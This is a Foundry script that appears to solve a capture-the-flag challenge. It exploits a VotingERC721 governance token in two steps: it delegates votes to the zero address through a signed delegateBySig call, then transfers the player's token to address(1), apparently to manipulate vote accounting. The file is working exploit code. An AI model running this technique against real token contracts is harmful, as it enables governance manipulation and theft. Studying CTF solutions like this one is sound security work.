// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Script.sol";
import "src/Challenge.sol";

contract Solve1 is Script {
    function run() external {
        uint privateKey = /* private key */;

        vm.startBroadcast(privateKey);

        Challenge challenge = Challenge(/* challenge address */);
        
        VotingERC721 token = challenge.votingToken();
        uint nonce = token.nonces(address(vm.addr(privateKey)));

        bytes32 domainSeparator = keccak256(
            abi.encode(
                bytes32(0x8cad95687ba82c2ce50e74f7b754645e5117c3a5bec8151c0726d5857980a866),
                keccak256(bytes("VotingERC721")), // name
                block.chainid, // chainid
                address(token) // tokenAddress
            )
        );
        bytes32 structHash = keccak256(
            abi.encode(
                bytes32(0xe48329057bfd03d55e49b547132e39cffd9c1820ad7b9d4c5307691425d15adf),
                address(0), // delegatee
                nonce, // nonce
                type(uint256).max // expiry
            )
        );

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);

        token.delegateBySig(address(0), nonce, type(uint256).max, v, r, s);

        vm.stopBroadcast();
    }
}

contract Solve2 is Script {
    function run() external {
        uint privateKey = /* private key */;

        vm.startBroadcast(privateKey);

        Challenge challenge = Challenge(/* challenge address */);
        
        VotingERC721 token = challenge.votingToken();

        token.transferFrom(challenge.PLAYER(), address(1), challenge.NORMAL_ID());

        vm.stopBroadcast();
    }
}